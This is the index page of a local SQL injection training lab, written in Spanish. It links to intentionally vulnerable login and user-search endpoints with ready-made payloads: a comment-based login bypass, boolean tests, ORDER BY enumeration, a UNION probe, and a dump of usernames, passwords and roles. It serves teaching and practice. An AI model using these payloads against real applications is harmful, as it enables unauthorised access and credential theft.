<?php
// Mini Lab Index - RedTeamLab (local only)
?>
<!doctype html>
<html lang="es">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Mini Lab SQLi - RedTeamLab</title>
  <style>
    body { font-family: system-ui, -apple-system, Segoe UI, Roboto, Arial, sans-serif; margin: 24px; line-height: 1.4; }
    code { background: #f2f2f2; padding: 2px 6px; border-radius: 6px; }
    .grid { display: grid; grid-template-columns: 1fr; gap: 18px; max-width: 980px; }
    .card { border: 1px solid #e5e5e5; border-radius: 14px; padding: 16px; }
    .card h2 { margin: 0 0 10px 0; font-size: 18px; }
    ul { margin: 10px 0 0 0; padding-left: 18px; }
    li { margin: 6px 0; }
    a { text-decoration: none; }
    a:hover { text-decoration: underline; }
    .tag { display: inline-block; font-size: 12px; padding: 2px 8px; border-radius: 999px; background: #f2f2f2; margin-left: 8px; }
    .warn { color: #8a2be2; }
    .crit { color: #b00020; }
  </style>
</head>
<body>
  <h1>Mini Lab SQLi - <code>RedTeamLab</code> (Local)</h1>
  <p>
    Endpoints:
    <code>/lab/vuln/login.php</code> y <code>/lab/vuln/searchUsers_RTLab.php</code>
  </p>

  <div class="grid">

    <div class="card">
      <h2>1) Login (vulnerable) <span class="tag crit">Bypass SQLi</span></h2>
      <ul>
        <li><a href="/lab/vuln/login.php?user=admin&pass=admin123">Login OK (admin/admin123)</a></li>
        <li><a href="/lab/vuln/login.php?user=admin&pass=wrong">Login FAIL (admin/wrong)</a></li>
        <li><a class="warn" href="/lab/vuln/login.php?user=admin%27%20--%20-&pass=x">SQLi Bypass (user=admin' -- -)</a></li>
      </ul>
      <p style="margin-top:10px;font-size:13px;color:#555;">
        Nota: el bypass funciona porque <code>--</code> comenta el resto del WHERE y elimina la comprobación de contraseña.
      </p>
    </div>

    <div class="card">
      <h2>2) searchUsers (vulnerable) - RedTeamLab <span class="tag crit">SQLi UNION</span></h2>
      <ul>
        <li><a href="/lab/vuln/searchUsers_RTLab.php?id=1">Normal (id=1)</a></li>
        <li><a href="/lab/vuln/searchUsers_RTLab.php?id=99999">Sin resultados (id=99999)</a></li>
        <li><a class="warn" href="/lab/vuln/searchUsers_RTLab.php?id=1%27">Error SQL (id=1')</a></li>
      </ul>
    </div>

    <div class="card">
      <h2>3) Boolean-based (control lógico) <span class="tag">AND</span></h2>
      <ul>
        <li><a href="/lab/vuln/searchUsers_RTLab.php?id=1%27%20AND%201%3D1%20--%20-">True: id=1' AND 1=1 -- -</a></li>
        <li><a href="/lab/vuln/searchUsers_RTLab.php?id=1%27%20AND%201%3D2%20--%20-">False: id=1' AND 1=2 -- -</a></li>
      </ul>
    </div>

    <div class="card">
      <h2>4) Enumeración columnas (ORDER BY) <span class="tag">Recon</span></h2>
      <ul>
        <li><a href="/lab/vuln/searchUsers_RTLab.php?id=1%27%20ORDER%20BY%201%20--%20-">ORDER BY 1</a></li>
        <li><a class="warn" href="/lab/vuln/searchUsers_RTLab.php?id=1%27%20ORDER%20BY%202%20--%20-">ORDER BY 2 (debería fallar)</a></li>
      </ul>
      <p style="margin-top:10px;font-size:13px;color:#555;">
        Si falla en <code>2</code>, implica que el <code>SELECT</code> original devuelve <b>1 columna</b>.
      </p>
    </div>

    <div class="card">
      <h2>5) UNION - control de output <span class="tag crit">PoC</span></h2>
      <ul>
        <li><a class="warn" href="/lab/vuln/searchUsers_RTLab.php?id=-1%27%20UNION%20SELECT%201%20--%20-">UNION test (muestra 1)</a></li>
      </ul>
    </div>

    <div class="card">
      <h2>6) Enumeración y dump (1 columna → GROUP_CONCAT) <span class="tag crit">Exfil</span></h2>
      <ul>
        <li>
          <a href="/lab/vuln/searchUsers_RTLab.php?id=-1%27%20UNION%20SELECT%20GROUP_CONCAT(column_name)%20FROM%20information_schema.columns%20WHERE%20table_schema%3D%27RedTeamLab%27%20AND%20table_name%3D%27users%27%20--%20-">
            Listar columnas (GROUP_CONCAT)
          </a>
        </li>
        <li>
          <a class="warn" href="/lab/vuln/searchUsers_RTLab.php?id=-1%27%20UNION%20SELECT%20GROUP_CONCAT(username%2C%27%3A%27%2Cpassword%2C%27%3A%27%2Crole%20SEPARATOR%20%27%20%7C%20%27)%20FROM%20users%20--%20-">
            Dump final (username:password:role)
          </a>
        </li>
      </ul>
      <p style="margin-top:10px;font-size:13px;color:#555;">
        Esto está pensado <b>solo</b> para práctica local y entender SQLi.
      </p>
    </div>

  </div>

  <hr style="margin:10px 0; border:none; border-top:0.5px solid #eee;">
  <p style="font-size:16px;color:#666;">
    Si algún link da 404, revisa mayúsculas/minúsculas del archivo: en Linux importan.
  </p>
<footer style="
  margin-top:20px;
  padding-top:16px;
  border-top:1px solid #eee;
  font-size:18px;
  color:#555;
">
  <p style="margin:0 0 8px 0;">

    <strong>Creado por:</strong> Enrique Forte <em>(aka qu1qu3h4ck)</em>
  </p>

  <ul style="list-style:none; padding:0; margin:0;">
    <li>🔗 LinkedIn:
      <a href="https://www.linkedin.com/in/enriqueforte" target="_blank">
        www.linkedin.com/in/enriqueforte
      </a>
    </li>
    <li>💻 GitHub:
      <a href="https://github.com/enriqueforte" target="_blank">
        github.com/enriqueforte
      </a>
    </li>
    <li>🌐 Portfolio:
      <a href="https://enriqueforte.web.app/" target="_blank">
        enriqueforte.web.app
      </a>
    </li>
  </ul>

  <p style="margin-top:10px; font-size:14px; color:#777;">
    ⚠️ Laboratorio educativo local para prácticas de SQL Injection y seguridad ofensiva.<br>
    No utilizar en entornos productivos ni sin autorización explícita.
  </p>
  <p style="margin-top:6px; font-size:14px; color:#777;">
    🎯 Enfoque: Pentesting Web · SQL Injection · Secure Coding · Red Team fundamentals
  </p>
</footer>
</body>
</html>
